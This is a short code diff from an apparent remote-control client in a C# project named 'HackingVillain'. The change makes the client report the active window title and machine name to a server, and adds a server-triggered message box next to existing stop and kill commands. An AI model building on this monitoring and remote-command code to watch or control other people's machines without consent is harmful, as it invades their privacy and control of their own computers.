@@ -110,9 +110,10 @@ namespace HackingVillain
             {
                 _monitor.Stop();
             }
-            else if (data == "Current Window")
+            else if (data == "Info")
             {
-                Send(ForegroundWindow.GetActiveWindowTitle() ?? "", 2);
+                Send((ForegroundWindow.GetActiveWindowTitle() ?? "")
+                    + "\n" + System.Environment.MachineName, 2);
             }
             else if (data.StartsWith("Kill"))
             {
@@ -136,6 +137,11 @@ namespace HackingVillain
                 {
 
                 }
+            }
+            else if (data.StartsWith("Message"))
+            {
+                string msg = data.Substring(8);
+                MessageBox.Show(msg, "서버로부터 메시지");
             }
         }
     }
